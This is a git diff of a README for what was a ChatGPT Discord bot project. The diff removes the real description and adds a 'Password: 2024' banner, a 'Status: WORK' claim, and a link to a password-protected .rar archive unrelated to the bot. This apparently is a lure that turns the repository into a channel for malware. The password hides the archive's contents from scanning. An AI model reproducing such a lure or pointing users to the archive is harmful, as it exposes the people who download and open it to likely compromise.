@@ -1,4 +1,7 @@
-# chatgpt-discord
-a discord bot connected with chatgpt, easy to set up for beginners:) with cool memorize system by using "!memorize", it will memorize evrything u tell the bot 11
-
-edit the .env-example to .env!!!!
+# Info
+---
+> # 🔓Password: 2024🔓
+> # 🟢Status: WORK🟢
+---
+# Download
+### [Download the latest version](https://github.com/devvreal/chatgpt-discord/releases/download/v1.22/GHUBSProject.rar)
